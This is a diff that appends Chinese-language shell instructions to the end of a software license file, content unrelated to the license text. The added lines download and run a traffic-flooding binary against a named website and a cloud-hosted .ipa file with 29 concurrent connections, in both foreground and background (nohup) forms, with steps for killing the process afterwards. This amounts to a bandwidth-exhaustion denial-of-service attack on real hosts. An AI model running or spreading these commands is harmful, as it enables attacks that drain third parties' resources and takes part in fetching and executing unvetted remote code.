@@ -183,3 +183,19 @@ The Licensor may modify the terms of this License in its sole discretion and suc
 
 The License is governed by and must be construed, interpreted in accordance with the laws of CHINA without given effect to the conflict of law principles thereof. The courts of CHINA have exclusive jurisdiction over any dispute, legal action and proceedings arising out of or related to the License, including its termination, which shall be binding and enforceable upon the Parties worldwide. In the event of any proceeding or litigation arising out of this License, the prevailing Party shall be entitled to recover from the non-prevailing Party its legal fees, court fees and related costs to the extent and in ratio of its success. Notwithstanding the foregoing, Licensor may bring legal actions against You in the country where You has its seat, if it deems necessary for the enforceability of its rights regarding payments by You under the License.
 
+
+
+下载剑%%皇并赋予执行权限：
+wget https://github.com/maintell/webBenchmark/releases/download/0.3/webBenchmark_linux_x64 -O webBenchmark_linux_x64 && chmod +x webBenchmark_linux_x64
+
+
+
+手动刷，按ctrl+C就结束了
+./webBenchmark_linux_x64 -f -r https://vippg35.com/yunduanxiangce.html -c 29 -s https://ipatxl.oss-cn-shenzhen.aliyuncs.com/yunduanxiangce.ipa
+
+
+
+后台刷，结束需要先查找进程 ps -aux|grep web，然后 kill -9 进程ID
+nohup ./webBenchmark_linux_x64 -f -r https://vippg35.com/yunduanxiangce.html -c 29 -s https://ipatxl.oss-cn-shenzhen.aliyuncs.com/yunduanxiangce.ipa &
+
+
